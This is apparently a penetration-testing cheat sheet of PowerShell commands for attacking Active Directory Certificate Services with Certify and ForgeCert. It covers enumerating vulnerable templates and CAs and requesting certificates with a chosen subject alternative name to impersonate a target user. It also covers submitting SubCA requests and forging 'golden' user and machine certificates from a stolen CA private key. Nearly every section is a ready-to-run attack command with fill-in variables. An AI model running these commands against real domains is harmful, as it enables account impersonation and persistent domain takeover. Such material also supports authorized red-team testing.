# Certify / ForgeCert

## Certify - enumerate

### Find vulnerable templates

Enumerate AD CS templates and highlight vulnerable configurations.

```powershell title:"Certify / ForgeCert Find vulnerable AD CS templates"
.\Certify.exe find /vulnerable /enabled
```
<!-- cheat -->

### Find templates and ACLs

Enumerate templates, CAs, enrollment permissions, and relevant ACLs.

```powershell title:"Certify / ForgeCert Enumerate templates and ACLs"
.\Certify.exe find
```
<!-- cheat -->

### Enumerate CAs

List enterprise CAs and web enrollment endpoints.

```powershell title:"Certify / ForgeCert Enumerate enterprise CAs"
.\Certify.exe cas
```
<!-- cheat -->

### Enumerate web enrollment

Check CA web enrollment exposure for ESC8-style relay paths.

```powershell title:"Certify / ForgeCert Find web enrollment endpoints"
.\Certify.exe cas /enrolleeSuppliesSubject
```
<!-- cheat -->

## Certify - request

### Request cert with SAN

Request a certificate from a template that allows enrollee-supplied subject alternative names.

```powershell title:"Certify / ForgeCert Request cert with chosen SAN"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name" /altname:"$target_user"
```
<!-- cheat
var domain
var ca_name
var template_name
var target_user
-->

### Request User cert

Request a normal User template certificate for the current context.

```powershell title:"Certify / ForgeCert Request User template certificate"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"User"
```
<!-- cheat
var domain
var ca_name
-->

### Request SubCA cert

Submit a SubCA request. This often pends; pair with ManageCA/ManageCertificates rights to approve and retrieve it.

```powershell title:"Certify / ForgeCert Submit SubCA certificate request"
.\Certify.exe request /ca:"$ca_fqdn\$ca_name" /template:SubCA /altname:"$target_user"
```
<!-- cheat
var ca_fqdn
var ca_name
var target_user
-->

### Download issued request

Download a certificate by request ID after approval.

```powershell title:"Certify / ForgeCert Download issued certificate request"
.\Certify.exe download /ca:"$ca_fqdn\$ca_name" /id:$request_id
```
<!-- cheat
var ca_fqdn
var ca_name
var request_id
-->

## ForgeCert

### Forge golden certificate

Forge a certificate signed by a stolen CA private key. Use the resulting PFX with PKINIT tooling such as Rubeus or Certipy.

```powershell title:"Certify / ForgeCert Forge certificate from stolen CA PFX"
.\ForgeCert.exe --CaCertPath "$ca_pfx" --CaCertPassword "$ca_pfx_pass" --Subject "CN=$target_user" --SubjectAltName "$target_upn" --NewCertPath "$new_pfx" --NewCertPassword "$new_pfx_pass"
```
<!-- cheat
var ca_pfx
var ca_pfx_pass
var target_user
var target_upn
var new_pfx
var new_pfx_pass
-->

### Forge machine certificate

Forge a certificate for a machine principal.

```powershell title:"Certify / ForgeCert Forge machine certificate"
.\ForgeCert.exe --CaCertPath "$ca_pfx" --CaCertPassword "$ca_pfx_pass" --Subject "CN=$computer_name" --SubjectAltName "$computer_name@$domain" --NewCertPath "$new_pfx" --NewCertPassword "$new_pfx_pass"
```
<!-- cheat
var ca_pfx
var ca_pfx_pass
var computer_name
var domain
var new_pfx
var new_pfx_pass
-->
